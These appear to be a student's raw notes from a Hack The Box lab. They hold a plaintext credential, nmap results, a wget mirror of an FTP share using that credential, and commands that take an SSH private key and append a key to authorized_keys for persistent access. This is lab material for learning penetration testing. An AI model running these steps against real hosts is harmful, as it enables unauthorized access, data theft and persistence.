# fingerprints
(fin) ssh-ed25519: SHA256:AtNYHXCA7dVpi58LB+uuPe9xvc2lJwA6y7q82kZoBNM
(fin) ssh-rsa: SHA256:gYf8woxUQ0oVmCnny4K4fmsnijf3aZcdeZGb2kKxPUQ

ceil:qwer1234

ssh -o PubkeyAuthentication=no -o PreferredAuthentications=password -v ceil@$TARGET

21/tcp   open  ftp     ProFTPD
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f4c8f10f1aebecd31247ca14eab846d (RSA)
|   256 7b30376750b9ad91c08ff702783b7c02 (ECDSA)
|_  256 889e0e07fecad05c60abcf1099cd6ca7 (ED25519)
53/tcp   open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
2121/tcp open  ftp     ProFTPD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


wget -m --no-passive ftp://ceil:qwer1234@10.129.232.204:2121

tree .

cd $TARGET\:2121/

ls -latr

cd .ssh/

ssh-copy-id ceil@$TARGET

cat id_rsa.pub | ssh ceil@$TARGET "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"

chmod 600 id_rsa
chmod 600 id_rsa.pub

ssh -i /home/htb-ac-786011/10.129.232.204:2121/.ssh/id_rsa ceil@$TARGET
